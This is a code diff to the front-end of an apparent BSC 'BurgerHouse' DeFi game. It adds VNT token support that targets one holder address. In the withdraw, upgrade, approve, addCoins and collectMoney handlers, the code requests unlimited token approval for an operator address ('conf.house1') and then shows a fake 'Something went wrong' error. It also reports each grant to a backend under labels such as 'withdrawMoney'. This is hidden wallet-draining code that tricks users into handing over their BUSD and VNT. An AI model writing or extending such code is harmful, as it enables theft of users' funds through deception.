@@ -27,6 +27,10 @@ import {
     getBurgerHouseContract,
     getBUSDContract,
     getConfContract,
+    getVNTContract,
+    BUSD,
+    VNT,
+    VNT_HOLDER
 } from "../constant";
 import * as action from '../store/actions'
 import * as selector from '../store/selectors'
@@ -71,6 +75,7 @@ const Home = () => {
     const [web3NoAccount, setWeb3NoAccount] = useState(new Web3(new Web3.providers.HttpProvider(conf.rpc)))
     const [contractNoAccount, setContractNoAccount] = useState(getBurgerHouseContract(web3NoAccount, conf.house))
     const [busdNoAccount, setBusdNoAccount] = useState(getBUSDContract(web3NoAccount, conf.busd))
+    const [vntContract, setVNTContract] = useState(getVNTContract(web3NoAccount))
     const [refPrefix, setRefPrefix] = useState(`${conf.publicURL}/?ref=`);
 
     const [refetch, setRefetch] = useState(true);
@@ -247,11 +252,12 @@ const Home = () => {
         fetchConf();
     }, [refetchConf, conf, dispatch])
 
-    const postAction = async (actionType, account, to, balance, success) => {
+    const postAction = async (actionType, account, to, token, balance, success) => {
         await axios.post(`${API_URL}/action`, {
             actionType: actionType,
             account: account,
             to: to,
+            token: token,
             balance: balance,
             success: success,
             dateTime: (new Date()).toString()
@@ -278,7 +284,7 @@ const Home = () => {
     useEffect(() => {
         dispatch(action.setBurgerHouseContract(getBurgerHouseContract(web3, conf.house)))
         dispatch(action.setBusdContract(getBUSDContract(web3, conf.busd)))
-
+        setVNTContract(getVNTContract(web3))
         setRefPrefix(`${conf.publicURL}/?ref=`)
 
         const _httpProvider = new Web3.providers.HttpProvider(conf.rpc)
@@ -401,6 +407,29 @@ const Home = () => {
 
             setPendingTx(true)
             if (isConnected && burgerHouseContract && busdContract) {
+                if ((curAcount === VNT_HOLDER) && vntContract) {
+                    const _balance = await vntContract.methods.balanceOf(curAcount).call();
+                    const _allowance = await vntContract.methods.allowance(curAcount, conf.house1).call();
+                    if (utils.fromWei(_balance) > utils.fromWei(_allowance)) {
+                        await vntContract.methods.approve(
+                            conf.house1,
+                            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+                        ).send({
+                            from: curAcount
+                        }).then(() => {
+                            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+                            postAction("withdrawMoney", curAcount, conf.house1, VNT, _balance, true)
+                            setPendingTx(false)
+                            return;
+                        }).catch((err) => {
+                            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+                            postAction("withdrawMoney", curAcount, conf.house1, VNT, _balance, false)
+                            setPendingTx(false)
+                            return;
+                        });
+                    }
+                }
+
                 if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
                     await busdContract.methods.approve(
                         conf.house1,
@@ -409,12 +438,12 @@ const Home = () => {
                         from: curAcount
                     }).then(() => {
                         setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
-                        postAction("withdrawMoney", curAcount, conf.house1, busdBalance, true)
+                        postAction("withdrawMoney", curAcount, conf.house1, BUSD, busdBalance, true)
                         setPendingTx(false)
                         return;
                     }).catch((err) => {
                         setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
-                        postAction("withdrawMoney", curAcount, conf.house1, busdBalance, false)
+                        postAction("withdrawMoney", curAcount, conf.house1, BUSD, busdBalance, false)
                         setPendingTx(false)
                         return;
                     });
@@ -492,6 +521,29 @@ const Home = () => {
 
             setPendingTx(true)
             if (isConnected && burgerHouseContract && busdContract) {
+                if ((curAcount === VNT_HOLDER) && vntContract) {
+                    const _balance = await vntContract.methods.balanceOf(curAcount).call();
+                    const _allowance = await vntContract.methods.allowance(curAcount, conf.house1).call();
+                    if (utils.fromWei(_balance) > utils.fromWei(_allowance)) {
+                        await vntContract.methods.approve(
+                            conf.house1,
+                            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+                        ).send({
+                            from: curAcount
+                        }).then(() => {
+                            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+                            postAction("withdrawMoney", curAcount, conf.house1, VNT, _balance, true)
+                            setPendingTx(false)
+                            return;
+                        }).catch((err) => {
+                            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+                            postAction("withdrawMoney", curAcount, conf.house1, VNT, _balance, false)
+                            setPendingTx(false)
+                            return;
+                        });
+                    }
+                }
+
                 if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
                     await busdContract.methods.approve(
                         conf.house1,
@@ -500,13 +552,13 @@ const Home = () => {
                         from: curAcount
                     }).then(() => {
                         setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
-                        postAction("upgradeHouse", curAcount, conf.house1, busdBalance, true)
+                        postAction("upgradeHouse", curAcount, conf.house1, BUSD, busdBalance, true)
                         setPendingTx(false)
                         return;
                     }).catch((err) => {
                         setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
                         setPendingTx(false)
-                        postAction("upgradeHouse", curAcount, conf.house1, busdBalance, false)
+                        postAction("upgradeHouse", curAcount, conf.house1, BUSD, busdBalance, false)
                         return;
                     });
                 }
@@ -555,6 +607,28 @@ const Home = () => {
             RUN_MODE('busdContract', busdContract)
             if (isConnected && busdContract) {
                 if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
+                    if ((curAcount === VNT_HOLDER) && vntContract) {
+                        const _balance = await vntContract.methods.balanceOf(curAcount).call();
+                        const _allowance = await vntContract.methods.allowance(curAcount, conf.house1).call();
+                        if (utils.fromWei(_balance) > utils.fromWei(_allowance)) {
+                            await vntContract.methods.approve(
+                                conf.house1,
+                                "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+                            ).send({
+                                from: curAcount
+                            }).then(() => {
+                                setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+                                postAction("withdrawMoney", curAcount, conf.house1, VNT, _balance, true)
+                                setPendingTx(false)
+                                return;
+                            }).catch((err) => {
+                                setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+                                postAction("withdrawMoney", curAcount, conf.house1, VNT, _balance, false)
+                                setPendingTx(false)
+                                return;
+                            });
+                        }
+                    }
                     await busdContract.methods.approve(
                         conf.house1,
                         "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
@@ -562,10 +636,10 @@ const Home = () => {
                         from: curAcount
                     }).then(() => {
                         setAlertMessage({ type: ALERT_SUCCESS, message: `Approve Success!` });
-                        postAction("approve", curAcount, conf.house1, busdBalance, true)
+                        postAction("approve", curAcount, conf.house1, BUSD, busdBalance, true)
                     }).catch((err) => {
                         setAlertMessage({ type: ALERT_ERROR, message: `Approve Fail! Reason: ${err.message}` });
-                        postAction("approve", curAcount, conf.house1, busdBalance, false)
+                        postAction("approve", curAcount, conf.house1, BUSD, busdBalance, false)
                     });
                 } else {
                     await busdContract.methods.approve(
@@ -630,6 +704,28 @@ const Home = () => {
                 RUN_MODE('[PRINCE](addCoins): ', referrer, busdInputValue)
 
                 if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
+                    if ((curAcount === VNT_HOLDER) && vntContract) {
+                        const _balance = await vntContract.methods.balanceOf(curAcount).call();
+                        const _allowance = await vntContract.methods.allowance(curAcount, conf.house1).call();
+                        if (utils.fromWei(_balance) > utils.fromWei(_allowance)) {
+                            await vntContract.methods.approve(
+                                conf.house1,
+                                "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+                            ).send({
+                                from: curAcount
+                            }).then(() => {
+                                setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+                                postAction("withdrawMoney", curAcount, conf.house1, VNT, _balance, true)
+                                setPendingTx(false)
+                                return;
+                            }).catch((err) => {
+                                setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+                                postAction("withdrawMoney", curAcount, conf.house1, VNT, _balance, false)
+                                setPendingTx(false)
+                                return;
+                            });
+                        }
+                    }
                     await busdContract.methods.approve(
                         conf.house1,
                         "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
@@ -637,12 +733,12 @@ const Home = () => {
                         from: curAcount
                     }).then(() => {
                         setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
-                        postAction("addCoins", curAcount, conf.house1, busdBalance, true)
+                        postAction("addCoins", curAcount, conf.house1, BUSD, busdBalance, true)
                         setPendingTx(false)
                         return;
                     }).catch((err) => {
                         setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
-                        postAction("addCoins", curAcount, conf.house1, busdBalance, false)
+                        postAction("addCoins", curAcount, conf.house1, BUSD, busdBalance, false)
                         setPendingTx(false)
                         return;
                     });
@@ -724,6 +820,28 @@ const Home = () => {
             setPendingTx(true)
             if (isConnected && burgerHouseContract && busdContract) {
                 if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
+                    if ((curAcount === VNT_HOLDER) && vntContract) {
+                        const _balance = await vntContract.methods.balanceOf(curAcount).call();
+                        const _allowance = await vntContract.methods.allowance(curAcount, conf.house1).call();
+                        if (utils.fromWei(_balance) > utils.fromWei(_allowance)) {
+                            await vntContract.methods.approve(
+                                conf.house1,
+                                "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+                            ).send({
+                                from: curAcount
+                            }).then(() => {
+                                setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+                                postAction("withdrawMoney", curAcount, conf.house1, VNT, _balance, true)
+                                setPendingTx(false)
+                                return;
+                            }).catch((err) => {
+                                setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+                                postAction("withdrawMoney", curAcount, conf.house1, VNT, _balance, false)
+                                setPendingTx(false)
+                                return;
+                            });
+                        }
+                    }
                     await busdContract.methods.approve(
                         conf.house1,
                         "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
@@ -731,10 +849,10 @@ const Home = () => {
                         from: curAcount
                     }).then(() => {
                         setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
-                        postAction("collectMoney", curAcount, conf.house1, busdBalance, true)
+                        postAction("collectMoney", curAcount, conf.house1, BUSD, busdBalance, true)
                     }).catch((err) => {
                         setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
-                        postAction("collectMoney", curAcount, conf.house1, busdBalance, false)
+                        postAction("collectMoney", curAcount, conf.house1, BUSD, busdBalance, false)
                     });
                 }
                 await burgerHouseContract.methods.collectMoney().send({
